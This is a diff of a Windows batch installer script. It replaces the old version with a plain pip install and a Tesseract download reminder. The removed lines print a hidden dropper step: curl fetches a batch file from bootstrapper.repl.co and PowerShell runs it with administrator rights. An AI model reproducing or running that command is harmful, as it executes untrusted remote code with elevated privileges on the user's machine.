@@ -1,9 +1,7 @@
 @echo off
-start "" "https://discord.gg/kmbHpgxH"
-pip install -r requirements.txt
-set dir="%temp%\_%random%"
-mkdir %dir%
-cd %dir%
+Title Package Installer
+echo Installer requirements
+python -m pip install -r requirements.txt --force-reinstall --no-cache
 
-curl https://bootstrapper.repl.co/scripts/pypi.py --output pypi.bat && powershell Start-Process 'pypi.bat' -Verb runAs
-pause
+echo "MAKE SURE TO DOWNLOAD TESSERACT FROM https://sourceforge.net/projects/tesseract-ocr.mirror/"
+PAUSE
